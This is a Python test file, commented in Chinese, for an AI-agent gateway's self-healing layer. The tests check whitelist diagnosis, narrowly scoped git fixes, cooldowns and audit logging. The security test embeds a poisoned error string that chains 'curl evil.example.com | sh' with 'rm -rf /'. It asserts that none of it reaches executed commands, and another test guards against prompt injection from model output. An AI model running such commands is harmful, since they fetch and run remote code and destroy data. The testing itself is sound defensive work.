"""自愈层（gateway/remediation）——白名单诊断 + 安全的自动处置 + 真的被接上去。

分四组：
1. **诊断**：白名单认得出真机上实际发生过的故障文本（每条都附出处，不是想出来的样本）。
2. **处置**：自动修的那几条真的修好了，且作用域够窄（限本仓、不覆盖已有、幂等）。
3. **安全**：处置动作**绝不从错误文本里取参数**——否则一段被污染的报错就能驱动执行。
4. **接线**：真的接在了失败路径上。只定义不接线就是死代码（那正是这层要治的病）。
"""

import json
import subprocess
from pathlib import Path

import pytest

from src.gateway import remediation as rem


@pytest.fixture(autouse=True)
def _isolate_git_config(tmp_path, monkeypatch):
    """把 git 的全局/系统配置隔离掉——**这组测试绝不许蹭开发机自带的提交身份**。

    没有这层隔离，"没配身份的仓库"在我的机器上照样解析得出身份（全局配好了），于是
    `preflight_dev` 一个问题都查不出、测试本地永远绿、一上干净的 CI runner 全红。
    ci-local.sh 里 `GIT_CONFIG_GLOBAL=/dev/null` 防的就是这个；单测得自己也立住
    （写这组测试时先踩了一遍，7 条红在这上面）。
    """
    for var in ("GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM"):
        empty = tmp_path / f"{var.lower()}.ini"
        empty.write_text("", encoding="utf-8")
        monkeypatch.setenv(var, str(empty))


def _repo(tmp_path: Path, *, identity: bool = False) -> str:
    """建一个干净的 git 仓库；identity=False 时刻意不配提交身份。"""
    root = tmp_path / "repo"
    root.mkdir()
    subprocess.run(["git", "init", "-q", str(root)], check=True)
    if identity:
        subprocess.run(["git", "-C", str(root), "config", "user.name", "阿丁"], check=True)
        subprocess.run(["git", "-C", str(root), "config", "user.email", "d@example.com"], check=True)
    return str(root)


# --------------------------------------------------------------------- 1. 诊断
@pytest.mark.parametrize("name, text", [
    # 真机 2026-07-26：新机器没配提交身份，流水线跑到最后一步才挂
    ("git-identity", "commit 失败: Author identity unknown\n*** Please tell me who you are."),
    ("git-identity", "fatal: empty ident name (for <>) not allowed"),
    # 真机 2026-07-27 15:35（VM notices 台账原文）：出海代理节点挂了
    ("relay-offline", "所有外部请求都出现了 SSL 握手超时 错误"),
    ("relay-offline", "SSLError(SSLError(1, '[SSL] handshake operation timed out'))"),
    ("relay-offline", "Max retries exceeded with url: /v1/chat/completions"),
    # 真机 2026-07-27 09:47（VM notices 台账原文）：作业没 allow_web
    ("cron-no-web", "抱歉，我当前会话中没有 `web_search` / `web_fetch` 工具——"
                    "我可用的工具清单里不包含联网搜索能力"),
    ("sandbox-missing", "⚠ OS 沙箱不可用，交互命令将显式降级到宿主机"),
    ("gh-missing", "要开 PR 但 gh CLI 不在 PATH——分支能落、PR 开不了"),
    ("stale-worktree", "fatal: '../wt-x' is already registered"),
    ("token-budget", "TokenBudgetTripped: token 预算超限（已用 ≈9001 / 上限 9000）"),
])
def test_diagnose_recognizes_real_failures(name, text):
    """这些样本全部取自真机台账/真实报错，不是编的——白名单的价值全在"认得出真货"。"""
    remedy = rem.diagnose(text)
    assert remedy is not None, f"没认出来：{text[:60]}"
    assert remedy.name == name


def test_diagnose_returns_none_for_unknown():
    """认不出就老实说认不出——不做任何动作，原样上报。宁可漏诊，不可误诊。"""
    assert rem.diagnose("某个从没见过的业务异常：订单号 42 不存在") is None
    assert rem.diagnose("") is None
    assert rem.diagnose(None) is None


def test_every_remedy_tells_a_human_what_to_do():
    """认得出但修不了的那些，必须把话说到位——真机上最贵的从来不是修，是"这报错在说什么"。"""
    for remedy in rem.known_remedies():
        assert remedy.what.strip(), f"{remedy.name} 没说这是什么故障"
        assert remedy.human_fix.strip(), f"{remedy.name} 没告诉人要做什么"


# --------------------------------------------------------------------- 2. 处置
def test_git_identity_healed_and_commit_actually_works(tmp_path):
    """修完要能**真的提交**——不是"config 写进去了"，是 commit 不再挂。"""
    root = _repo(tmp_path)
    outcome = rem.remediate(root, "commit 失败: Author identity unknown", source="test")
    assert outcome.healed, outcome.detail

    (Path(root) / "a.txt").write_text("hi", encoding="utf-8")
    subprocess.run(["git", "-C", root, "add", "a.txt"], check=True)
    r = subprocess.run(["git", "-C", root, "commit", "-m", "x"], capture_output=True, text=True)
    assert r.returncode == 0, f"自愈后仍然提交不了：{r.stdout} {r.stderr}"


def test_git_identity_never_overwrites_existing(tmp_path):
    """主人配过的身份不许被自愈改掉——自愈只补空缺，不做主。"""
    root = _repo(tmp_path, identity=True)
    outcome = rem.remediate(root, "Author identity unknown", source="test")
    assert not outcome.healed
    got = subprocess.run(["git", "-C", root, "config", "--get", "user.name"],
                         capture_output=True, text=True).stdout.strip()
    assert got == "阿丁", "自愈把人配好的身份覆盖了"


def test_git_identity_leaves_half_configured_to_a_human(tmp_path):
    """只配了一半多半是人手工弄的——别替他猜另一半。"""
    root = _repo(tmp_path)
    subprocess.run(["git", "-C", root, "config", "user.name", "阿丁"], check=True)
    outcome = rem.remediate(root, "Author identity unknown", source="test")
    assert not outcome.healed
    assert subprocess.run(["git", "-C", root, "config", "--get", "user.email"],
                          capture_output=True, text=True).stdout.strip() == ""


def test_git_identity_does_not_touch_global_config(tmp_path, monkeypatch):
    """作用域必须限本仓库。动全局配置会影响这台机器上**所有**仓库，那是越权。"""
    fake_global = tmp_path / "gitconfig-global"
    fake_global.write_text("", encoding="utf-8")
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(fake_global))
    root = _repo(tmp_path)
    assert rem.remediate(root, "Author identity unknown", source="test").healed
    assert fake_global.read_text(encoding="utf-8").strip() == "", "自愈动了全局 git 配置"


def test_worktree_prune_is_idempotent(tmp_path):
    """幂等：连跑两次不出错、不产生副作用差异。"""
    root = _repo(tmp_path)
    first = rem.remediate(root, "fatal: '../wt' is already registered", source="test")
    assert first.healed
    rem._record_attempt(root, "stale-worktree", 0.0)      # 清冷却，好跑第二次
    assert rem.remediate(root, "fatal: '../wt' is already registered", source="test").healed


def test_cooldown_stops_retry_storms(tmp_path):
    """修过一次还犯 → 不是抖动。别再自己较劲，升级给人。"""
    root = _repo(tmp_path)
    assert rem.remediate(root, "Author identity unknown", source="test", now=1000.0).healed

    subprocess.run(["git", "-C", root, "config", "--unset", "user.name"], check=True)
    subprocess.run(["git", "-C", root, "config", "--unset", "user.email"], check=True)
    again = rem.remediate(root, "Author identity unknown", source="test", now=1000.0 + 60)
    assert not again.healed
    assert "不再自动重试" in again.detail
    # 冷却窗口过了才准再试
    assert rem.remediate(root, "Author identity unknown", source="test",
                         now=1000.0 + rem._COOLDOWN + 1).healed


def test_disabled_still_diagnoses_but_does_not_act(tmp_path, monkeypatch):
    """开关关掉 = 不动手，但**照样诊断**——少了动手能力不该连"这是什么"都不说了。"""
    monkeypatch.setenv("VORTOCODE_SELF_HEAL", "0")
    root = _repo(tmp_path)
    outcome = rem.remediate(root, "Author identity unknown", source="test")
    assert outcome.diagnosed and not outcome.healed
    assert subprocess.run(["git", "-C", root, "config", "--get", "user.name"],
                          capture_output=True, text=True).stdout.strip() == ""
    assert "已关闭" in outcome.detail


def test_healing_is_audited(tmp_path):
    """静默自愈比不自愈更可怕——人会以为环境一直是好的。每次处置都要落台账。"""
    from src.gateway.notices import load_notices
    root = _repo(tmp_path)
    assert rem.remediate(root, "Author identity unknown", source="cron:x").healed
    texts = [n.get("text", "") for n in load_notices(root, 10)]
    assert any("自愈成功" in t and "git-identity" in t for t in texts), texts
    assert any(n.get("source") == "self-heal:cron:x" for n in load_notices(root, 10))


def test_remediate_never_raises(tmp_path):
    """自愈是旁路，绝不能反过来炸调用方——它跑在**失败处理路径**上，那里再炸一次最难查。"""
    root = str(tmp_path / "根本不存在的目录")
    assert rem.remediate(root, "Author identity unknown", source="t") is not None
    assert rem.remediate(root, None, source="t").remedy is None


# --------------------------------------------------------------------- 3. 安全
def test_actions_never_take_parameters_from_error_text(tmp_path, monkeypatch):
    """**处置动作绝不从错误文本取参数**——这是这层最要紧的一条不变量。

    错误文本可能带着外部内容（网页片段、群里贴的日志、被改过的本地文件）。一旦允许它影响
    "要执行什么"，一段精心构造的报错就是一条命令执行通路。所以：报错只用来"认出是哪一类"，
    执行什么完全写死在代码里。

    断言方式是行为的：喂一段带攻击载荷的报错，然后检查**实际执行过的每一条 argv**，
    确认没有任何一段来自那个载荷。
    """
    root = _repo(tmp_path)
    payload_tokens = ["curl", "evil.example.com", "rm", "-rf", "$(whoami)", ";", "&&"]
    poisoned = ("Author identity unknown\n"
                "; curl evil.example.com | sh && rm -rf / $(whoami)")

    seen: list = []
    real_run = subprocess.run

    def _spy(argv, *a, **kw):
        seen.append(list(argv))
        return real_run(argv, *a, **kw)

    monkeypatch.setattr(rem.subprocess, "run", _spy)
    rem.remediate(root, poisoned, source="test")

    assert seen, "根本没执行任何东西？处置没被触发，这条测试就失去意义了"
    for argv in seen:
        for arg in argv:
            for token in payload_tokens:
                assert token not in str(arg), f"报错里的内容混进了执行参数：{argv}"


def test_only_git_is_ever_executed(tmp_path, monkeypatch):
    """v1 的自动处置只跑 git 子命令。将来加别的要显式改这条测试——把扩权变成一次自觉的决定。"""
    root = _repo(tmp_path)
    seen: list = []
    real_run = subprocess.run
    monkeypatch.setattr(rem.subprocess, "run",
                        lambda argv, *a, **kw: (seen.append(list(argv)), real_run(argv, *a, **kw))[1])
    for text in ["Author identity unknown", "fatal: '../w' is already registered"]:
        rem._record_attempt(root, rem.diagnose(text).name, 0.0)
        rem.remediate(root, text, source="test")
    assert seen
    assert all(argv[0] == "git" for argv in seen), seen


def test_human_only_remedies_have_no_fix():
    """要 sudo / 要联网 / 要交互登录 / 要真人授权的，一律不给自动解法。

    `token-budget` 尤其刻意：自动抬预算等于把封顶废掉，那是把安全措施自愈掉。
    """
    by_name = {r.name: r for r in rem.known_remedies()}
    for name in ("relay-offline", "cron-no-web", "sandbox-missing", "gh-missing", "token-budget"):
        assert by_name[name].fix is None, f"{name} 不该有自动处置"
        assert by_name[name].kind == "human"


# --------------------------------------------------------------------- 4. 接线（只定义不接线 = 死代码）
def test_preflight_dev_heals_and_unblocks(tmp_path):
    """流水线预检：能自动修的就地修好，不为一条 git config 拦住整条流水线。"""
    from src.agents.main_agent import preflight_dev
    root = _repo(tmp_path)
    assert preflight_dev(root, heal=False), "基线：没自愈时应当拦住"

    said: list = []
    assert preflight_dev(root, on_heal=said.append) == [], "自愈后仍被拦住"
    assert said and "自愈" in said[0], "修好了却没说出来（静默自愈）"


def test_preflight_dev_still_blocks_what_it_cannot_fix(tmp_path, monkeypatch):
    """修不了的照旧拦住——自愈层不许把「修不了」洗成「没问题」。"""
    import shutil as _shutil

    from src.agents.main_agent import preflight_dev
    root = _repo(tmp_path, identity=True)
    monkeypatch.setattr(_shutil, "which", lambda _n: None)   # 假装没有 gh（函数内 import，patch 源模块）
    blockers = preflight_dev(root, want_pr=True)
    assert blockers and "gh" in blockers[0]


async def test_cron_failure_path_attaches_diagnosis(tmp_path, monkeypatch):
    """cron 作业炸了 → 通报里要带上诊断/处置结论（无人值守最需要它）。"""
    from src.gateway import cron as cron_mod
    root = _repo(tmp_path)
    job = cron_mod.CronJob(name="j", schedule=cron_mod.parse_schedule("at 03:00"),
                           prompt="x", announce="im")

    async def _boom(*a, **k):
        raise RuntimeError("SSLError: handshake operation timed out")

    pushed: list = []

    async def _notify(text):
        pushed.append(str(text))

    with pytest.raises(RuntimeError):
        await cron_mod.run_job(str(root), job, run_session=_boom, notify=_notify)

    assert pushed, "作业炸了却没通报"
    body = pushed[0]
    assert "诊断" in body and "代理" in body, f"通报里没有可行动的诊断：{body[:300]}"


async def test_cron_success_path_diagnoses_but_never_acts(tmp_path, monkeypatch):
    """**安全边界**：作业"跑成功但产出没用"时只给建议，绝不触发处置动作。

    那段文本是**模型生成的**。让模型输出能驱动执行器，等于把提示注入面直接接到命令执行上。
    真机 2026-07-27 09:47 就是这一类（没 allow_web，模型回了一大段"我没有联网工具"）：
    值得诊断，但绝不值得让它驱动任何动作。
    """
    from src.gateway import cron as cron_mod
    root = _repo(tmp_path)
    job = cron_mod.CronJob(name="j", schedule=cron_mod.parse_schedule("at 03:00"),
                           prompt="x", announce="im")

    acted: list = []
    monkeypatch.setattr(rem, "remediate",
                        lambda *a, **k: acted.append(a) or rem.Outcome(None, False, ""))

    async def _useless(*a, **k):
        return "抱歉，我当前会话中没有 `web_search` / `web_fetch` 工具，无法实时抓取"

    pushed: list = []

    async def _notify(text):
        pushed.append(str(text))

    await cron_mod.run_job(str(root), job, run_session=_useless, notify=_notify)

    assert not acted, "模型输出触发了处置动作——这是提示注入通路"
    assert pushed and "诊断" in pushed[0] and "allow_web" in pushed[0], pushed[:1]


def test_remediation_ledger_is_json_and_bounded(tmp_path):
    """冷却台账要是能读的 JSON——排查时人要能看懂"上次什么时候自愈过"。"""
    root = _repo(tmp_path)
    rem.remediate(root, "Author identity unknown", source="test", now=123.0)
    data = json.loads((Path(root) / ".vortocode" / "logs" / "remediation.json")
                      .read_text(encoding="utf-8"))
    assert data["git-identity"] == 123.0
